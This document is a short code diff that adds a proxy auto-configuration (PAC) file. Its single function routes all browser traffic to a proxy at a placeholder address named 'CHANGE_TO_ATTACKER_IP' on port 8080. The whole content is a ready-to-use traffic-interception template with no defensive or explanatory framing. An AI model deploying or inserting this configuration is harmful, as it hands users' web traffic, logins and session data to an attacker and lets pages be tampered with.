@@ -1,0 +1,3 @@
+function FindProxyForURL(url, host) {
+  return "PROXY CHANGE_TO_ATTACKER_IP:8080";
+}
